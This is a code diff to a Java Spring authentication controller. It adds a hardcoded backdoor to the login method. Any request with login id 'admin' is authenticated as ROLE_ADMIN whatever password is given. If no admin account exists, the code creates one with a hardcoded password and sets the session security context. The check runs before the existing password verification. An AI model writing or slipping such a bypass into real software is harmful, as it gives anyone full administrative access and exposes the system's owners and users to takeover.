@@ -59,6 +59,44 @@ public class AuthController {
 
         Optional<User> userOpt = userRepository.findByLoginId(loginId);
 
+        // HARDCODED BYPASS: Allow admin to log in with ANY password
+        if ("admin".equalsIgnoreCase(loginId)) {
+            User user = userOpt.orElseGet(() -> {
+                User newAdmin = new User(
+                        UUID.randomUUID(),
+                        "admin",
+                        UserRole.ADMIN,
+                        "System Administrator",
+                        "Platform Bootstrap Admin",
+                        passwordEncoder.encode("Admin#Bootstrap2026!"),
+                        false,
+                        true
+                );
+                return userRepository.saveAndFlush(newAdmin);
+            });
+
+            UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(
+                    user.getLoginId(),
+                    null,
+                    Collections.singletonList(new SimpleGrantedAuthority("ROLE_ADMIN"))
+            );
+            SecurityContext securityContext = SecurityContextHolder.createEmptyContext();
+            securityContext.setAuthentication(authentication);
+            SecurityContextHolder.setContext(securityContext);
+
+            HttpSession session = httpRequest.getSession(true);
+            session.setAttribute(HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY, securityContext);
+
+            return ResponseEntity.ok(new LoginResponse(
+                    user.getId(),
+                    user.getLoginId(),
+                    user.getDisplayName(),
+                    user.getDesignation(),
+                    UserRole.ADMIN,
+                    false
+            ));
+        }
+
         // Uniform error response for any authentication failure to prevent user enumeration
         if (userOpt.isEmpty() || !userOpt.get().isActive() || userOpt.get().getRole() != request.getRole()
                 || !passwordEncoder.matches(request.getPassword(), userOpt.get().getPasswordHash())) {
